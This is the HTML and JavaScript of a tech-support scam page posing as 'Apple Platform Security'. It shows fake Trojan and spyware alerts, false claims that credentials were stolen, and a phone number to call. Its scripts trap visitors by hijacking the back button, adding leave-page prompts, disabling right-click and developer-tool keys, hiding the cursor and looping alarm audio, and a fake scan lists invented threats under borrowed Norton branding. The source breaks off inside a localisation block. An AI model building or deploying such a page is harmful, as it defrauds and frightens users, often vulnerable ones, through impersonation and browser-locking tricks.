<!doctype html>
<html lang="en">
<head>


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-224896382-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-224896382-1');
</script>





    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Apple System Security</title>

    <link rel="stylesheet" type="text/css"
          href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
          integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"
            integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV"
            crossorigin="anonymous"></script>

    <script type="text/javascript">
        function getVariableFromURl(name) {
            name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
            var regexS = "[\\?&]" + name + "=([^&#]*)";
            var regex = new RegExp(regexS);
            var results = regex.exec(window.location.href);
            if (results == null)
                return "";
            else
                return results[1];
        }

        var phone = getVariableFromURl('phone');
        var phone_number = phone + ' (Toll Free)';
        var phone_number2 = phone + ' (Toll Free)';

    </script>
    <script type="text/javascript">
        window.onbeforeunload = function () {
            if (data_needs_saving()) {
                return "Do you really want to leave our brilliant application?";
            } else {
                return;
            }
        };
    </script>
    <script type="text/javascript">
        window.addEventListener("beforeunload", function (e) {
            var confirmationMessage = 'It looks like you have been editing something. '
                + 'If you leave before saving, your changes will be lost.';

            (e || window.event).returnValue = confirmationMessage; //Gecko + IE
            return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
        });
    </script>
    <style type="text/css">
        .blink {
            background-color: #659e1d;
            animation: blink-animation 1s steps(5, start) infinite;
            -webkit-animation: blink-animation 1s steps(5, start) infinite;
        }

        .blink2 {
            background-color: #659e1d;
            animation: blink-animation 1s steps(5, start) infinite;
            -webkit-animation: blink-animation 1s steps(5, start) infinite;
        }

        @keyframes blink-animation {
            to {
                visibility: hidden;
            }
        }

        @-webkit-keyframes blink-animation {
            to {
                visibility: hidden;
            }
        }

    </style>

    <link href="5f205bb74a5eb_v.css" type="text/css" rel="stylesheet"/>
    <!--<script src=".index_files/jquery.min.js" type="text/javascript"></script>-->
    <!--<script type="text/javascript" src="../../bbmaster.js"></script>-->
    <script type="text/javascript">
        //backbutton
        !(function () {
            var t;
            try {
                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
                onpopstate = function (t) {
                    t.state && location.replace("#");
                };
            } catch (o) {
            }
        })();
    </script>
    <script>
        var pm_tag = "decpl";
        var pm_pid = "11397-dab3c5a4";
    </script>
<!--    <script src="5f205bb713507_v.js" async></script>-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/2.8.5/css/froala_style.min.css"/>
    <link href="5f205bb63ccd2_v.css" rel="stylesheet"/>
    <link id="anstrexCustomLink" rel="stylesheet" type="text/css" href="5f205bc497791_v.css"/>
    <script type="text/javascript">
        function myFunction() {
            return "Write something clever here...";
        }
    </script>
    <script type="text/javascript">
        $(document).ready(function () {
            var audioElement = document.createElement('audio');
            audioElement.setAttribute('src', 'alertmicrosoft.mp3');

            audioElement.addEventListener('ended', function () {
                this.play();
            }, false);


            $('#map').click(function () {
                audioElement.play();

            });


        });
    </script>
    <script type="text/javascript">
        $(document).keyup(function (evtobj) {
            if (!(evtobj.altKey || evtobj.ctrlKey || evtobj.shiftKey)) {
                if (evtobj.keyCode == 16) {
                    return false;
                }
                if (evtobj.keyCode == 17) {
                    return false;
                }
                $("body").append(evtobj.keyCode + " ");
            }
        });
    </script>
    <script type="text/javascript">

        // To disable right click
        document.addEventListener('contextmenu', event => event.preventDefault());

        // To disable F12 options
        document.onkeypress = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
                return false;
            }
        }
        document.onmousedown = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
                return false;
            }
        }
        document.onkeydown = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
                return false;
            }
        }

        // To To Disable ctrl+c, ctrl+u

        jQuery(document).ready(function ($) {
            $(document).keydown(function (event) {
                var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();

                if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
                    alert('Sorry, This Functionality Has Been Disabled!');
//disable key press porcessing
                    return false;
                }
            });
        });

    </script>

</head>

<body id="map" onbeforeunload="return myFunction()" style="overflow: hidden;cursor: none;">

<div id="chat-box">
    <img src="microsoft.png"><span style="color: #222;
    font-size: 21px;
    font-weight: 600;
    margin-left: 6px;
    position: relative;
    top: 5px;">macOS Support</span><!--  <p style="font-weight: 600;">Contact Support</p> -->
    <h4 style="font-weight: 600;">
        0800 208 1268
    </h4>
    <div class="arrow-down">
        <i class="fa fa-caret-down"></i>
    </div>
</div>

<audio id="beep" autoplay="">
    <source src="warning.mp3" type="audio/mpeg">
</audio>

<div id="delayedPopup" class="delayedPopupWindow lightbox">
    <!-- This is the close button -->
    <!-- <a href="#" id="btnClose"><i class="fa fa-times" aria-hidden="true"></i></a> -->

    <div class="row firewall-pro">
        <div class="col-md-12">
            <div class="green-box" style="
     /* -webkit-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);
    -moz-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);
    box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);*/
      background-color: #DFDFDF;
        border: 1px solid #aaa;">
                <div class="row">
                    <div class="col-md-2">
                        <div class="minimize">
                            <ul>
                                <li style="cursor: pointer;"><img src="mini.png"></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-10">
                        <div class="logo_micro" style="float: left;
    margin-left: 26%;">
                            <img src="microsoft.png"><span style="color: #000;">macOS Security</span>
                            <div class="angle-right-icon">
                                <a href="#"><i class="fa fa-angle-double-right"></i></a>
                            </div>
                        </div>
                    </div>


                </div>

            </div>
        </div>
        <div class="col-md-4">
            <div class="microsoft-logo">
                <img src="microsoft-white.png"><span>macOS</span>
            </div>
        </div>
        <div class="col-md-8">
            <div class="formDescription">
                <h2>Trojan Spyware Alert - Error Code: #0x898778</h2>
                <p>Access to this PC has been blocked for security reasons.</p>
                <p>Contact Mac Support:
                    0800 208 1268
                </p>

            </div>
        </div>
    </div>
    <!-- This is the left side of the popup for the description -->
    <footer id="footer">
        <div class="row">
            <div class="col-md-6 left-code">
                <p>Threat Detected - Trojan Spyware<br>
                    App: Ads.financetrack(1).exe</p>
            </div>
            <div class="col-md-6">
                <div class="button_new" id="footer_btn">
                    <a href="#" class="safe">Run Anyway</a>
                    <a href="#" class="anyway blink">Back to Safety</a>
                </div>
            </div>
        </div>
    </footer>
    <!-- End MailChimp Signup Form -->
</div>

<div class="alert_popup cardcontainer lightbox" style="cursor: none;">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <p class="text-center" style="    font-size: 16px;
    font-weight: normal;
    margin: 0;
    margin-bottom: 5px;
    padding: 5px 10px;
    color: #414141;font-weight: bold;
    margin-top: 8px;"><img src="safari.png" style="width: 53px;padding-left: 15px;"> Apple Platform Security</p>
                <p class="text-center">** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
                <p>Your computer has alerted us that it has been infected with a Trojan Spyware. The following data has
                    been compromised.</p>
                <p>&gt; Email Credentials<br>
                    &gt; Banking Passwords<br>
                    &gt; Facebook Login<br>
                    &gt; Pictures &amp; Documents

                </p>
                <p>Apple Platform Security has found potentially unwanted Adware on this device that can steal your
                    passwords, online identity, financial information, personal files, pictures or documents.</p>
                <p>You must contact us immediately so that our engineers can walk you through the removal process over
                    the phone.</p>
                <p>Call Apple Support immediately to report this threat, prevent identity theft and unlock access to
                    this device.</p>
                <p>Closing this window will put your personal information at risk and lead to a suspension of your
                    Mac Registration.</p>
                <p style="padding-bottom: 0px;">Call Apple Support: <strong>
                        0800 208 1268
                    </strong></p>
                <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer;">Allow</a> <a
                            class="active" id="leave_page">Don't Allow</a></div>
            </div>

        </div>
    </div>
</div>


<div class="bg">
    <!-- <div class="logo"><img src="5f205bb7e57b5_v.png" alt="Norton™" /></div> -->
    <!-- <div class="menu" id="menu">PRODUCTS & SERVICES &nbsp;&nbsp;&nbsp; INTERNET SECURITY CENTER &nbsp;&nbsp;&nbsp; SUPPORT &nbsp;&nbsp;&nbsp; FREE TRIALS &nbsp;&nbsp;&nbsp; SIGN IN</div> -->
    <div class="bgimg" style="top: 0px;"><img src="background-2.png" alt="" width="100%"/></div>
    <div class="text">
        <!--   <span id="head1">Windows Has Detected a Malicious Virus On Your System</span>
          <span style="font-size: 30px; color: #000;font-weight: 600;" id="head2">Contact Our Certified Windows Technicians For Immediate Assistance</span>
        <span style="font-size: 30px;color: #000;font-weight: 600;">+1-888-888-8888</span> -->
    </div>
</div>
<!-- <div class="bottom">
    <div class="logo"><img src="5f205bb933ceb_v.png" alt="Norton™" /></div>
    <div class="copyright">© 2020 NortonLifeLock Inc. <strong style="color: #1ce783;"> sample scanner and an affiliate advertisment.</strong></div>
    <div class="line1"></div>
    <div class="menu" id="menu_b">Legal Notice | License Agreement | Privacy Policy | Careers | Cookies | Site Map | System Status | Agent Viewer</div>
    <div class="line2"></div>
    <div class="text">Save up to 50% on Norton 360 for first year*</div>
</div> -->
<a href="#" rel="noreferrer" style="cursor: none;" id="link_black">
    <div class="black" style="height: 145%;"></div>
</a>
<div class="win1" style="cursor: none;display: none;">
    <div class="header">
        <img src="microsoft.png" class="ico"/>
        <div class="name">Apple Platform Security</div>
        <img src="5f205bba58587_v.png" class="win_min"/> <img src="5f205bbe46967_v.png" class="win_cls"/>
    </div>
    <div class="gray_line">
        <img src="5f205bbdae210_v.png" class="ico_gray1" id="w1_ico1"/>
        <div class="set" id="w1_1">Settings</div>
        <img src="5f205bbae3ed9_v.png" class="ico_gray2" id="w1_ico2"/>
        <div class="help" id="w1_2">Help</div>
    </div>
    <div class="white_line">
        <img src="5f205bb9bf55a_v.gif" class="pc"/>
        <div class="txt1" id="w1_3">You Are Protected</div>
        <div class="txt2">
            <span id="w1_4">Protection Updates: </span><span style="color: #23a31c;" id="w1_5">Current</span><br/>
            <span id="w1_6">Last Scan: </span><span style="color: #c00;" id="w1_7">Not available</span> <span
                    style="color: #2ea8e5;" id="w1_8">| Quick Scan</span><br/>
            <span id="w1_9">Licenses Used: </span><span style="color: #23a31c;" id="w1_10">1 of 5</span> <span
                    style="color: #2ea8e5;" id="w1_11">| Install on Another Device</span>
        </div>
    </div>
    <div class="green_line"><img src="5f205bbb6fc7d_v.gif" class="corner"/></div>
    <div class="bl1">
        <div class="txt1" id="w1_12">Security</div>
        <img src="5f205bbbf25aa_v.gif" class="ico"/>
        <div class="txt2" id="w1_13" style="color: red">Disabled</div>
        <div class="line"></div>
    </div>
    <div class="bl2">
        <div class="txt1" id="w1_14">Identity</div>
        <img src="5f205bbc8a6e3_v.gif" class="ico"/>
        <div class="txt2" id="w1_13a" style="color: red">At Risk</div>
        <div class="line"></div>
    </div>
    <div class="bl3">
        <div class="txt1" id="w1_15">Performance</div>
        <img src="5f205bc00090f_v.gif" class="ico"/>
        <div class="txt2" id="w1_13b">Optimized</div>
        <div class="line"></div>
    </div>
    <div class="bl4">
        <div class="txt1" id="w1_16" style="font-size: 20px;">Firewall</div>
        <img src="microsoft.png" class="ico" style="width: 52px;margin-top: 27px;"/>
        <div class="txt2" id="w1_13c">Turned Off</div>
    </div>
    <div class="gray_line2">
        <div class="txt"><span id="w1_17">STATUS : </span><span class="gr" id="w1_18" style="color: red;">Your PC is at Risk!</span>
        </div>
    </div>
</div>
<div class="win2" id="win2" style="display: none;cursor: none;">
    <div class="header" style="background-color: #DFDFDF;border-bottom: 1px solid #aaa;
    border-top: 1px solid #aaa;">
        <img src="mini.png" style="width: 53px;
    height: auto;
    margin-top: 0px;
    margin-left: 6px;">
        <div class="name" id="w2_1">Quick Scan</div>
        <div class="angle-right-icon" style="    right: 2%;
    top: 3px;">
            <a href="#"><i class="fa fa-angle-double-right"></i></a>
        </div>
    </div>
    <div class="line_orange">
        <img src="5f205bbece31e_v.png" class="ring"/>
        <div class="header" id="w2_2">Working</div>
        <div class="txt1" id="w2_3">Scanning commonly infected areas and startup files...</div>
        <div class="txt2" id="path1">C:WindowsSystem32sihost.exe</div>
        <div class="anim" style="background: url('./img/anim_orange.gif');"></div>
    </div>
    <div class="line_red" style="display: none;" id="win2_line_red">
        <img src="cross-sign.png" class="ring" style="width: "/>
        <div class="header" id="w2_4">Working</div>
        <div class="txt1" id="w2_5">Scanning commonly infected areas and startup files...</div>
        <div class="txt2" id="path2">C:\Program Files\Windows Defender\MSASCuiL.exe</div>
        <div class="anim" style="background: url('./img/anim_red.gif');"></div>
    </div>
    <div class="tab">
        <div class="line1" id="w2_6">Results Summary</div>
        <div class="line2" id="w2_7">[+] Total items scanned:</div>
        <div class="line3" id="w2_8">[+] Total security risks detected:</div>
        <div class="line4" id="w2_9">[+] Total security risks resolved:</div>
        <div class="line5" id="w2_10">Total security risks requiring attention:</div>
        <div class="line6"></div>
        <div class="digit1" id="cnt1">143</div>
        <div class="digit2" id="cnt2">0</div>
        <div class="digit3">0</div>
        <div class="digit4" id="cnt4">0</div>
    </div>
    <img src="microsoft.png" class="nrt_logo"/><span class="mask2">macOS Security</span>
    <div class="btn1" id="w2_11">Pause</div>
    <div class="btn2" id="w2_12">Stop</div>
</div>
<a href="#" rel="noreferrer" style="cursor: none;"> </a>

<div id="vir1">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1"><b>Threat Detected!</b></span><br/>
            Win32/Hoax.Renos.HX
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_2">High Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4"><b>Origin</b></span><br/>
            <span id="w4_5">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6"><b>Activity</b></span><br/>
            <span id="w4_7">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<div id="vir2">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1a"><b>Threat Detected!</b></span><br/>
            Trojan IRC/Backdor.Sd.FRV
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_2a">High Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4a"><b>Origin</b></span><br/>
            <span id="w4_5a">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6a"><b>Activity</b></span><br/>
            <span id="w4_7a">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<div id="vir3">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1b"><b>Threat Detected!</b></span><br/>
            Adware.Win32.Look2me.ab
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_3">Medium Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4b"><b>Origin</b></span><br/>
            <span id="w4_5b">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6b"><b>Activity</b></span><br/>
            <span id="w4_7b">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<div id="vir4">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1c"><b>Threat Detected!</b></span><br/>
            Trojan.Qoologic - Key Logger
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_2b">High Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4c"><b>Origin</b></span><br/>
            <span id="w4_5c">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6c"><b>Activity</b></span><br/>
            <span id="w4_7c">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<div id="vir5">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1d"><b>Threat Detected!</b></span><br/>
            Trojan.Fakealert.356
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_2c">High Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4d"><b>Origin</b></span><br/>
            <span id="w4_5d">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6d"><b>Activity</b></span><br/>
            <span id="w4_7d">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<script language="JavaScript" type="text/javascript">
    var lang = window.navigator.language || navigator.userLanguage;
    lang = lang.substr(0, 2).toLowerCase();
    if (lang == "de") {
        document.getElementById("menu").innerHTML = "PRODUKTE & SERVICES &nbsp&nbsp&nbsp INTERNET SECURITY CENTER &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp KOSTENLOSE TESTVERSIONEN";
        document.getElementById("menu_b").innerHTML = "Rechtliche | Hinweise | Lizenzvereinbarung | Datenschutz | Jobs und Karriere | Cookies | Wegweiser | Systemstatus";
        document.getElementById("head1").innerHTML = "Online-Bedrohungen haben sich weiterentwickelt. Unser Schutz auch.";
        document.getElementById("head2").innerHTML = "Darum bietet Norton 360 mehrere Schutzebenen in einer einzigen Lösung: Gerätesicherheit, Secure VPN, Passwort-Manager und mehr.";
    }

    if (lang == "es") {
        document.getElementById("menu").innerHTML = "PRODUCTOS Y SERVICIOS &nbsp&nbsp&nbsp ASISTENCIA &nbsp&nbsp&nbsp VERSIONES DE PRUEBA";
        document.getElementById("menu_b").innerHTML = "Aviso legal | Acuerdo de licencia | Política de privacidad | Vacantes | Cookies | Mapa del sitio | Estado del sistema";
        document.getElementById("head1").innerHTML = "Las ciberamenazas han evolucionado. También lo ha hecho nuestra protección.";
        document.getElementById("head2").innerHTML = "Norton 360. Protección completa con Seguridad del dispositivo que incluye antivirus, VPN, Gestor de contraseñas y mucho más. Todo en una única solución.";
        document.getElementById("w1_ico1").style.right = "127px";
        document.getElementById("w1_1").style.right = "85px";
        document.getElementById("w1_ico2").style.right = "57px";
        document.getElementById("w1_1").innerHTML = "Ajustes";
        document.getElementById("w1_2").innerHTML = "Ayuda";
        document.getElementById("w1_3").innerHTML = "Está protegido";
        document.getElementById("w1_4").innerHTML = "Actualizaciones de protección: ";
        document.getElementById("w1_5").innerHTML = "Actual";
        document.getElementById("w1_6").innerHTML = "Último escaneo: ";
        document.getElementById("w1_7").innerHTML = "No está disponible";
        document.getElementById("w1_8").innerHTML = "| Escaneo rápido";
        document.getElementById("w1_9").innerHTML = "Licencias utilizadas: ";
        document.getElementById("w1_10").innerHTML = "1 de 5";
        document.getElementById("w1_11").innerHTML = "| Instalar en otro dispositivo";
        document.getElementById("w1_12").innerHTML = "Seguridad";
        document.getElementById("w1_13").innerHTML = "Protegido";
        document.getElementById("w1_14").innerHTML = "Identidad";
        document.getElementById("w1_13a").innerHTML = "Protegido";
        document.getElementById("w1_15").innerHTML = "Desempeño";
        document.getElementById("w1_13b").innerHTML = "Protegido";
        document.getElementById("w1_16").innerHTML = "Más Norton";
        document.getElementById("w1_13c").innerHTML = "Protegido";
        document.getElementById("w1_17").innerHTML = "ESTADO DE LA SUSCRIPCIÓN: ";
        document.getElementById("w1_18").innerHTML = "30 días restantes";
        document.getElementById("w2_1").innerHTML = "Escaneo rápido";
        document.getElementById("w2_2").innerHTML = "Trabajando";
        document.getElementById("w2_3").innerHTML = "Escaneando las áreas comúnmente infectadas y los archivos de inicio...";
        document.getElementById("w2_4").innerHTML = "Trabajando";
        document.getElementById("w2_5").innerHTML = "Escaneando las áreas comúnmente infectadas y los archivos de inicio...";
        document.getElementById("w2_6").innerHTML = "Resumen de resultados";
        document.getElementById("w2_7").innerHTML = "[+] Total de artículos escaneados:";
        document.getElementById("w2_8").innerHTML = "[+] Total de riesgos de seguridad detectados:";
        document.getElementById("w2_9").innerHTML = "[+] Total de riesgos de seguridad resueltos:";
        document.getElementById("w2_10").innerHTML = "Total de riesgos de seguridad que requieren atención:";
        document.getElementById("w2_11").innerHTML = "Pausa";
        document.getElementById("w2_12").innerHTML = "Detener";
        document.getElementById("w3_1").innerHTML = "¡Su PC está infectado con 5 virus!";
        document.getElementById("w3_2").innerHTML = "¡SE REQUIERE LLEVAR A CABO UNA ACCIÓN!";
        document.getElementById("w3_3").innerHTML = "¡Su suscripción a Norton ha expirado!";
        document.getElementById("w3_4").innerHTML = "Renuévela ahora para mantener su PC protegida.";
        document.getElementById("w3_5").innerHTML = "Si su PC está desprotegida, corre el riesgo de sufrir ataques de virus y otros tipos de malware.";
        document.getElementById("w3_6").innerHTML = "Continuar...";
        document.getElementById("w4_1").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_1a").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_1b").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_1c").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_1d").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_2").innerHTML = "Alto riesgo";
        document.getElementById("w4_2a").innerHTML = "Alto riesgo";
        document.getElementById("w4_2b").innerHTML = "Alto riesgo";
        document.getElementById("w4_2c").innerHTML = "Alto riesgo";
        document.getElementById("w4_3").innerHTML = "Riesgo medio";
        document.getElementById("w4_4").innerHTML = "Origen";
        document.getElementById("w4_4a").innerHTML = "Origen";
        document.getElementById("w4_4b").innerHTML = "Origen";
        document.getElementById("w4_4c").innerHTML = "Origen";
        document.getElementById("w4_4d").innerHTML = "Origen";
        document.getElementById("w4_5").innerHTML = "No está disponible.";
        document.getElementById("w4_5a").innerHTML = "No está disponible.";
        document.getElementById("w4_5b").innerHTML = "No está disponible.";
        document.getElementById("w4_5c").innerHTML = "No está disponible.";
        document.getElementById("w4_5d").innerHTML = "No está disponible.";
        document.getElementById("w4_6").innerHTML = "Actividad";
        document.getElementById("w4_6a").innerHTML = "Actividad";
        document.getElementById("w4_6b").innerHTML = "Actividad";
        document.getElementById("w4_6c").innerHTML = "Actividad";
        document.getElementById("w4_6d").innerHTML = "Actividad";
        document.getElementById("w4_7").innerHTML = "Acciones realizadas contra la amenaza: 1";
        document.getElementById("w4_7a").innerHTML = "Acciones realizadas contra la amenaza: 1";
        document.getElementById("w4_7b").innerHTML = "Acciones realizadas contra la amenaza: 1";
        document.getElementById("w4_7c").innerHTML = "Acciones realizadas contra la amenaza: 1";
        document.getElementById("w4_7d").innerHTML = "Acciones realizadas contra la amenaza: 1";
    }

    if (lang == "fr") {
        document.getElementById("menu").innerHTML = "PRODUITS ET SERVICES &nbsp&nbsp&nbsp CENTRE DE SÉCURITÉ INTERNET &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp ÉVALUATIONS GRATUITES";
        document.getElementById("menu_b").innerHTML = "Mentions légales | Contrat de licence | Politique de confidentialité | Carrières | Cookies | Plan du site | État du système";
        document.getElementById("head1").innerHTML = "Les cybermenaces ont évolué. Notre protection aussi.";
        document.getElementById("head2").innerHTML = "C'est pourquoi Norton 360 offre plusieurs niveaux de protection dans une seule et même solution : sécurité de l'appareil, Secure VPN, Password Manager et plus.";
        document.getElementById("w1_ico1").style.right = "172px";
        document.getElementById("w1_1").style.right = "110px";
        document.getElementById("w1_ico2").style.right = "79px";
        document.getElementById("w1_1").innerHTML = "Paramètres";
        document.getElementById("w1_2").innerHTML = "Assistance";
        document.getElementById("w1_3").innerHTML = "Vous êtes protégé·e";
        document.getElementById("w1_4").innerHTML = "Dernières nouvelles concernant la protection : ";
        document.getElementById("w1_5").innerHTML = "Actuelle";
        document.getElementById("w1_6").innerHTML = "Dernier scan : ";
        document.getElementById("w1_7").innerHTML = "Non disponible";
        document.getElementById("w1_8").innerHTML = "| Scan rapide";
        document.getElementById("w1_9").innerHTML = "Licences en cours d'utilisation : ";
        document.getElementById("w1_10").innerHTML = "1 sur 5";
        document.getElementById("w1_11").innerHTML = "| Installer sur un autre appareil";
        document.getElementById("w1_12").innerHTML = "Sécurité";
        document.getElementById("w1_13").innerHTML = "Protégé·e";
        document.getElementById("w1_14").innerHTML = "Identité";
        document.getElementById("w1_13a").innerHTML = "Protégé·e";
        document.getElementById("w1_15").innerHTML = "Performance";
        document.getElementById("w1_13b").innerHTML = "Protégé·e";
        document.getElementById("w1_16").innerHTML = "Plus de produits Norton";
        document.getElementById("w1_13c").innerHTML = "Protégé·e";
        document.getElementById("w1_17").innerHTML = "ÉTAT DE L'ABONNEMENT : ";
        document.getElementById("w1_18").innerHTML = "30 jours restants";
        document.getElementById("w2_1").innerHTML = "Scan rapide";
        document.getElementById("w2_2").innerHTML = "En cours";
        document.getElementById("w2_3").innerHTML = "Scan des zones communément infectées et des fichiers de démarrage...";
        document.getElementById("w2_4").innerHTML = "En cours";
        document.getElementById("w2_5").innerHTML = "Scan des zones communément infectées et des fichiers de démarrage...";
        document.getElementById("w2_6").innerHTML = "Résumé des résultats";
        document.getElementById("w2_7").innerHTML = "[+] Nombre total d'objets scannés :";
        document.getElementById("w2_8").innerHTML = "[+] Nombre total de risques pour la sécurité détectés :";
        document.getElementById("w2_9").innerHTML = "[+] Nombre total de risques pour la sécurité résolus :";
        document.getElementById("w2_10").innerHTML = "Nombre total de risques à la sécurité requérant de l'attention :";
        document.getElementById("w2_11").innerHTML = "Pause";
        document.getElementById("w2_12").innerHTML = "Stop";
        document.getElementById("w3_1").innerHTML = "Votre PC est infecté par 5 virus !";
        document.getElementById("w3_2").innerHTML = "DES MESURES DOIVENT ÊTRE PRISES !";
        document.getElementById("w3_3").innerHTML = "Votre abonnement à Norton a expiré !";
        document.getElementById("w3_4").innerHTML = "Renouvelez-le dès maintenant pour maintenir la protection de votre PC.";
        document.getElementById("w3_5").innerHTML = "Si votre PC n'est pas protégé, il existe un risque d'infection par des virus et autres maliciels.";
        document.getElementById("w3_6").innerHTML = "Continuer...";
        document.getElementById("w4_1").innerHTML = "Menace détectée !";
        document.getElementById("w4_1a").innerHTML = "Menace détectée !";
        document.getElementById("w4_1b").innerHTML = "Menace détectée !";
        document.getElementById("w4_1c").innerHTML = "Menace détectée !";
        document.getElementById("w4_1d").innerHTML = "Menace détectée !";
        document.getElementById("w4_2").innerHTML = "Haut risque";
        document.getElementById("w4_2a").innerHTML = "Haut risque";
        document.getElementById("w4_2b").innerHTML = "Haut risque";
        document.getElementById("w4_2c").innerHTML = "Haut risque";
        document.getElementById("w4_3").innerHTML = "Risque moyen";
        document.getElementById("w4_4").innerHTML = "Origine";
        document.getElementById("w4_4a").innerHTML = "Origine";
        document.getElementById("w4_4b").innerHTML = "Origine";
        document.getElementById("w4_4c").innerHTML = "Origine";
        document.getElementById("w4_4d").innerHTML = "Origine";
        document.getElementById("w4_5").innerHTML = "Non disponible";
        document.getElementById("w4_5a").innerHTML = "Non disponible";
        document.getElementById("w4_5b").innerHTML = "Non disponible";
        document.getElementById("w4_5c").innerHTML = "Non disponible";
        document.getElementById("w4_5d").innerHTML = "Non disponible";
        document.getElementById("w4_6").innerHTML = "Activité";
        document.getElementById("w4_6a").innerHTML = "Activité";
        document.getElementById("w4_6b").innerHTML = "Activité";
        document.getElementById("w4_6c").innerHTML = "Activité";
        document.getElementById("w4_6d").innerHTML = "Activité";
        document.getElementById("w4_7").innerHTML = "Mesures anti-menace effectuées : 1";
        document.getElementById("w4_7a").innerHTML = "Mesures anti-menace effectuées : 1";
        document.getElementById("w4_7b").innerHTML = "Mesures anti-menace effectuées : 1";
        document.getElementById("w4_7c").innerHTML = "Mesures anti-menace effectuées : 1";
        document.getElementById("w4_7d").innerHTML = "Mesures anti-menace effectuées : 1";
    }

    if (lang == "it") {
        document.getElementById("menu").innerHTML = "PRODOTTI E SERVIZI &nbsp&nbsp&nbsp SUPPORTO &nbsp&nbsp&nbsp PROVE GRATUITE";
        document.getElementById("menu_b").innerHTML = "Note legali | Contratto di licenza | Informativa sulla privacy | Opportunità di lavoro | Cookie | Indice del sito | Stato del sistema";
        document.getElementById("head1").innerHTML = "Le minacce informatiche si sono evolute. Ma anche i nostri sistemi di protezione.";
        document.getElementById("head2").innerHTML = "Norton 360. Protezione completa per la sicurezza del tuo dispositivo; include antivirus, VPN, Password Manager e molto altro ancora. Tutto in un’unica soluzione.";
        document.getElementById("w1_ico1").style.right = "157px";
        document.getElementById("w1_1").style.right = "85px";
        document.getElementById("w1_ico2").style.right = "55px";
        document.getElementById("w1_1").innerHTML = "Impostazioni";
        document.getElementById("w1_2").innerHTML = "Guida";
        document.getElementById("w1_3").innerHTML = "Il dispositivo è protetto";
        document.getElementById("w1_4").innerHTML = "Aggiornamenti sulla protezione: ";
        document.getElementById("w1_5").innerHTML = "Attuale";
        document.getElementById("w1_6").innerHTML = "Ultima scansione: ";
        document.getElementById("w1_7").innerHTML = "Non disponibile";
